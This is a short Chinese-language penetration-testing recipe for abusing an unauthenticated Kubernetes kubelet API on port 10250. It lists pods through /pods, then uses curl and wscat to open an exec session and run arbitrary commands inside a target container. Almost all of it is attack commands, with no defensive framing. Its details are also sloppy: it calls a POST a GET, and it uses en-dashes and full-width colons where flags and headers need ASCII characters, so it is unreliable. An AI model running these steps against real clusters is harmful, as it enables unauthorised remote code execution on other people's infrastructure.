	Kubernetes 在端口 10250 上公开了一个未经身份验证的 REST API。向 /pods 端点发送 GET 请求来获取 pod 列表。
	可以得到
	● 命名空间
	    ○ 监控
	● Pod 名称
	● 容器名称
	    ○ 推送网关
	发送get请求
	> curl –insecure -v -H "X-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version：channel.k8s.io" -H "Connection：upgrade" -H "Upgrade：SPDY/3.1" -X POST "https://<DOMAIN>:<PORT>/exec/<NAMESPACE>/<POD NAME>/<CONTAINER NAME>?command=<COMMAND TO EXECUTE>&input=1&output=1&tty=1"
	可以成功创建了一个 websocket 连接，注意记住返回包里面的Location Header值
	下载wscat
	> apt-get install node-ws
	执行命令
	> wscat -c "https://<DOMAIN>:<PORT>/<Location Header Value>" –no-check